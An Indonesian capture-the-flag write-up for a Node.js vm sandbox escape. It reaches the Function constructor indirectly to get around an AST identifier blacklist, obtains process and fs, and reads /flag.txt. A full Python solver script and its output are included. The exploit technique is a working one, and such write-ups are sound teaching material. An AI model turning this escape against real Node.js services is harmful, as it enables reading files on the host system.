# 4. FormCraft

**Kategori:** Web Exploitation  
**Target:** `http://cyberleague-shared-alb-586365318.ap-southeast-1.elb.amazonaws.com:30102`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

FormCraft memungkinkan pengguna membuat form dan memasang custom JavaScript validator. Validator dijalankan di Node.js `vm` sandbox.

Masalah utama bukan syntax bug biasa, melainkan asumsi bahwa blacklist AST dapat dijadikan security boundary.

## 4.1 Sandbox Execution

Validator dijalankan secara konseptual melalui:

```javascript
vm.runInContext(wrappedCode, sandbox, {
    timeout: 2000,
    displayErrors: false
})
```

Terdapat blacklist identifier `FORBIDDEN_IDENTIFIERS` yang berusaha mencegah identifier sensitif.

Namun blacklist hanya melihat syntax yang tertulis langsung.

## 4.2 Mendapatkan `Function` Tanpa Menulis `Function`

Objek `Object` tersedia di sandbox. Dari prototype object, kita dapat memperoleh property `constructor`:

```javascript
Object.getOwnPropertyDescriptor(
    Object.getPrototypeOf(Object),
    "constructor"
).value
```

Nilai tersebut adalah constructor `Function`.

Dengan demikian kita dapat membangun fungsi baru tanpa pernah menulis identifier `Function`:

```javascript
Object.getOwnPropertyDescriptor(
    Object.getPrototypeOf(Object),
    "constructor"
).value("return process")()
```

Mengapa blacklist gagal?

```text
Object              → diperbolehkan
"constructor"       → string literal
"return process"    → string literal
process              → tidak muncul sebagai identifier AST
Function             → tidak muncul sebagai identifier AST
```

## 4.3 Mendapatkan `fs`

Pada Node.js 20, tersedia API:

```javascript
process.getBuiltinModule("fs")
```

Maka file dapat dibaca tanpa `require()`.

Enumeration root:

```javascript
return JSON.stringify(
    process.getBuiltinModule("fs").readdirSync("/")
)
```

Pembacaan flag:

```javascript
return process.getBuiltinModule("fs")
    .readFileSync("/flag.txt", "utf8")
```

## 4.4 Solver

```python
#!/usr/bin/env python3

import json
import re
import sys
import requests

BASE = (
    "http://cyberleague-shared-alb-586365318."
    "ap-southeast-1.elb.amazonaws.com:30102"
)

session = requests.Session()

ESCAPE = (
    'Object.getOwnPropertyDescriptor('
    'Object.getPrototypeOf(Object), '
    '"constructor"'
    ').value'
)


def make_rule(function_body):
    return f"return {ESCAPE}({json.dumps(function_body)})()"


def create_validator(name, rule):
    r = session.post(
        f"{BASE}/api/validator",
        json={
            "name": name,
            "type": "expression",
            "rule": rule,
            "label": name,
            "description": "CTF",
        },
        timeout=10,
    )

    print(f"[+] create validator: HTTP {r.status_code}")
    if r.status_code != 200:
        print(r.text)
        sys.exit(1)

    return r.json()


def test_validator(name, value="x"):
    r = session.post(
        f"{BASE}/api/validator/{name}/test",
        json={"value": value},
        timeout=10,
    )

    print(f"[+] test validator: HTTP {r.status_code}")
    return r.json()


def exec_host(function_body):
    rule = make_rule(function_body)
    create_validator("solverEscape", rule)
    result = test_validator("solverEscape")
    return result.get("result")


def main():
    print("=" * 70)
    print("[*] FormCraft - VM Sandbox Escape")
    print("=" * 70)

    version = exec_host("return process.version")
    print(f"[+] Node version: {version}")

    root = exec_host(
        'return JSON.stringify('
        'process.getBuiltinModule("fs").readdirSync("/")'
        ')'
    )
    print(f"[+] / = {root}")

    candidates = []
    try:
        entries = json.loads(root)
    except Exception:
        entries = []

    for entry in entries:
        p = str(entry)
        if "flag" in p.lower():
            candidates.append(
                p if p.startswith("/") else "/" + p
            )

    candidates += [
        "/flag",
        "/flag.txt",
        "/app/flag",
        "/app/flag.txt",
        "/tmp/flag",
        "/tmp/flag.txt",
    ]

    seen = set()
    for path in candidates:
        if path in seen:
            continue
        seen.add(path)

        js = (
            'return process.getBuiltinModule("fs")'
            f'.readFileSync({json.dumps(path)}, "utf8")'
        )

        try:
            result = exec_host(js)
        except Exception as e:
            print(f"[-] Exception: {e}")
            continue

        print(f"[+] Result: {result!r}")
        m = re.search(r"CYBERLEAGUE\{[^}]+\}", str(result))
        if m:
            print(f"[+] FLAG: {m.group(0)}")
            return

    print("[-] Flag not found.")


if __name__ == "__main__":
    main()
```

## 4.5 Verifikasi

```text
[+] create validator: HTTP 200
[+] test validator: HTTP 200
[+] Node version: v20.20.2
[+] / = ["app","bin","dev","etc","flag.txt", ...]
[*] Trying /flag.txt
[+] create validator: HTTP 200
[+] test validator: HTTP 200
[+] Result: 'CYBERLEAGUE{pr0t0_4st_vm_ch41n_c0mb0}'
[+] FLAG: CYBERLEAGUE{pr0t0_4st_vm_ch41n_c0mb0}
```

## Root Cause

```text
Insufficient AST Blacklist
        ↓
Indirect Function Constructor Access
        ↓
Sandbox Escape
        ↓
process
        ↓
fs
        ↓
/flag.txt
```

## Flag

```text
CYBERLEAGUE{pr0t0_4st_vm_ch41n_c0mb0}
```

---
